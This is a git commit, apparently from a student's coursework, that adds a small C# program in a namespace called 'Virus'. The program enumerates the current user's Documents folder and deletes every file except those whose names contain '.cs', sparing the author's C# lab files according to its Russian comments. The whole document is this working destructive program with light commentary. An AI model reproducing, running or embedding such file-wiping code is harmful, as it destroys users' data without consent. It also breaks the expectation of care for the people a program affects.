77a995d22089c9eaad9252b43bdacb1ddc0b7683
s.ischanova <s.ischanova@thecoders.ru>
2022-01-01 21:28:14 +0500

    virus

---
+++ win_wi/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Virus
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments/*Programs  или Recent*/);// Перечисление адресов системных папок
+            string[] files = Directory.GetFiles($@"{path}", "*.*"); // расширение того , что в папке. * все названия , которые нам нужны.  создаем массив с путями к файлам в указанной папкe
+            for (int i = 0; i < files.Length; i++) // перебор файлов
+            {
+                if (Path.GetFileName(files[i]).Contains(".cs") != true)//нельзя удалять файлы с лабами по шарпу
+                {
+                    File.Delete(files[i]);
+                   
+                }
+            }
+         
+
+        }
+    }
+}
